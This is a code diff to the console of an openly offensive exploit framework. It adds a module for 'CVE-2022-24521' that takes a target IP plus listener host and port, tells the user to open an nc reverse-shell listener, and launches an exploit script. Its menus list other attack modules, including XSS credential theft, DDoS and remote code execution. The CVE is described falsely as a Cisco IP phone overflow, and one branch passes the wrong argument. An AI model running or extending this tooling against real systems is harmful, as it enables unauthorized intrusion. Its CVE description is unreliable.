@@ -139,13 +139,28 @@ color.red + """
 | ()() || ()() || :\/: || :\/: || :\/: || :\/: || :\/: || ()() || :\/: |
 | '--'F|| '--'R|| '--'A|| '--'M|| '--'E|| '--'W|| '--'O|| '--'R|| '--'K|
 `------'`------'`------'`------'`------'`------'`------'`------'`------'
+""",
+"""
+000000000000""" + color.warning + """1      1""" + color.white + """0000000000000000000000000000
+       000000""" + color.warning + """1""" + color.white + """0000""" + color.warning + """1""" + color.white + """0000000000000000
+  000""" + color.warning + """1""" + color.white + """0000000""" + color.warning + """111111""" + color.white + """00000000""" + color.warning + """1""" + color.white + """
+     """ + color.warning + """11""" + color.white + """0000""" + color.warning + """1111111111""" + color.white + """00000""" + color.warning + """11""" + color.white + """
+    00""" + color.warning + """11""" + color.white + """00""" + color.warning + """111111111111""" + color.white + """000""" + color.warning + """11""" + color.white + """000
+    000""" + color.warning + """1111111111111111111""" + color.white + """000000000000
+0000000  """ + color.red + """CVE-2022-24521""" + color.white + """  000000000000000000000000000000000000000
+   00000""" + color.warning + """11111111111111111""" + color.white + """000
+00000000""" + color.warning + """11111111111111111""" + color.white + """000000000
+   0000""" + color.warning + """1111111111111111111""" + color.white + """000000
+  0000""" + color.warning + """11""" + color.white + """00""" + color.warning + """1111111111111""" + color.white + """00""" + color.warning + """11""" + color.white + """000000000000
+00000""" + color.warning + """11""" + color.white + """000000""" + color.warning + """1111111""" + color.white + """000000""" + color.warning + """11""" + color.white + """000000
+   00""" + color.warning + """1""" + color.white + """000000000000000000000""" + color.warning + """1""" + color.white + """000000000000000000
 """]
     random_banner = random.choice(list)
     print(random_banner)
     print()
     print()
-    print(color.white + "        *[ " + color.red + "sc_framework v0.7" + color.white + "                          ]")
-    print("        *[ 30 exploits / 16 cve exploits / 10 payloads ]")
+    print(color.white + "        *[ " + color.red + "sc_framework v0.8" + color.white + "                          ]")
+    print("        *[ 31 exploits / 17 cve exploits / 10 payloads ]")
     print()
     print("sc_framework tip: type '" + color.blue + "help" + color.white + "' to see the " + color.underline + color.green + "scconsole" + color.white + " commands.")
     print()
@@ -215,6 +230,7 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
 """ + color.red + """server/browser_autopwn2""" + color.white + """                             18/02/03 07:10       This module exploits a Cross-Site Scripting (XSS) vulnerability to steal user credentials and deliver a phishing email to the user.
 """ + color.red + """linux/vulnerability-find""" + color.white + """                            25/02/08 09:27       find vulnerabilities like common open ports, if the password is weak, the kernal version.
 """ + color.red + """server/extract_table_db_column""" + color.white + """                      25/02/08 09:30       extract sensitive information with the payloads have, extract informations like tables, columns, databases.
+""" + color.red + """site/cve-2022-24521""" + color.white + """                                 22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.
 """)
     elif scconsole == "search exploit":
         print("""
@@ -250,7 +266,8 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
 """ + color.red + """site/DD_D_Attack""" + color.white + """                     25/02/01 02:01       for DoS and DDoS Attack (If your Internet is slow, that's gonna works slowly!).
 """ + color.red + """site/Directory-finder""" + color.white + """                25/02/06 06:11       Finds the Pages and directorys, and brute-forces the directorys (works slow).
 """ + color.red + """site/struts2_namespace_ognl""" + color.white + """          25/02/07 02:12       exploits the Struts2 framework to execute arbitrary code. It uses the OGNL injection vulnerability.
-""" + color.red + """site/reverse_http""" + color.white + """                                   25/02/08 06:53       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
+""" + color.red + """site/reverse_http""" + color.white + """                    25/02/08 06:53       the attacker sets up a listener on their own machine and waits for the server to send a request to their machine. When the server makes a request, the attacker's listener intercepts the request and executes a payload on the server. The payload can include commands to download malware, steal sensitive data, or gain access to the server's command-line interface (CLI).
+""" + color.red + """site/cve-2022-24521""" + color.white + """                  22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.
 """)
     elif scconsole == "search cve-exploits":
         print()
@@ -270,6 +287,7 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
         print(color.red + "tools/Heartbleed_cve-2014-0160" + color.white + "                         14/04/12 12:03       Heartbleed is a critical vulnerability in the OpenSSL library that allows attackers to steal sensitive information from compromised systems.")
         print(color.red + "tools/POODLE_cve-2014-3566" + color.white + "                             14/02/06 05:07       POODLE is a vulnerability in the SSL/TLS protocol that allows attackers to decrypt encrypted traffic.")
         print(color.red + "tools/Slammer_cve-2007-5391" + color.white + "                            07/05/23 01:12       Slammer is a worm-like exploit that targets vulnerable systems running the Windows operating system.")
+        print(color.red + "tools/cve-2022-24521" + color.white + "                                   22/04/12 10:43       CVE-2022-24521 is a stack-based buffer overflow vulnerability in the login.cgi script of the Cisco Small Business 7000 Series IP Phones, which allows an unauthenticated attacker to execute arbitrary commands on the device.")
         print()
         print("You can't run these exploits from here, you need to run them from ",os.getcwd(),"/tools/cve-exploits/")
         print()
@@ -467,6 +485,10 @@ search <exploits | exploit | windows | site | cve-exploits | osx | linux | multi
         time.sleep(0.5)
         print("using linux/vulnerability-find.")
         lexploitvulnerabilityfind()
+    elif scconsole == "use site/cve-2022-24521":
+        time.sleep(0.5)
+        print("using site/cve-2022-24521.")
+        tcve202224521()
     elif scconsole == "use system commands":
             OSconsole()
             OSconsole()
@@ -1995,6 +2017,53 @@ you will specifiy these options when you run or exploit it!
         time.sleep(0.5)
         Console()
     elif scconsole49 == "exit":
+        exit()
+
+def tcve202224521():
+    scconsole50 = input("sc~" + color.red + "(site/cve-2022-24521)" + color.white + ">")
+    if scconsole50 == "help":
+        print("""
+help ---> to see this help menu.
+clear ---> to clear the screen.
+unuse ---> to unuse this exploit.
+exit ---> to exit from scconsole.
+run ---> to run the exploit you selected.
+exploit ---> to run the exploit you selected.
+show options ---> to see the options.
+""")
+        tcve202224521()
+    elif scconsole50 == "clear":
+        os.system('clear')
+        tcve202224521()
+    elif scconsole50 == "show options":
+        print("""
+OPTIONS          | DISCREPTIONS
+-----------------|----------------------
+RHOST            | specifiy the target ip address(website IP Address).
+LHOST            | specifiy the listening host.
+LPORT            | specifiy yhe listening port.
+
+run this command in another terminal after specifiying the options ---> """ + color.green + """nc -lvnp <port>""" + color.white + """
+you will specifiy these options when you run or exploit it!
+""")
+        tcve202224521()
+    elif scconsole50 == "run":
+        rhost4 = input("RHOST: ")
+        lhost4 = input("LHOST: ")
+        lport4 = input("LPORT: ")
+        os.system(f'python exploits/site/cve-2022-24521.py {rhost4} {lhost4} {lport4}')
+        tcve202224521()
+    elif scconsole50 == "exploit":
+        rhost5 = input("RHOST: ")
+        lhost5 = input("LHOST: ")
+        lport5 = input("LPORT: ")
+        os.system(f'python exploits/site/cve-2022-24521.py {rhost5} {lhost5} {lhost5}')
+        tcve202224521()
+    elif scconsole50 == "unuse":
+        print("unusing site/cve-2022-24521.")
+        time.sleep(0.5)
+        Console()
+    elif scconsole50 == "exit":
         exit()
 
 def OSconsole():
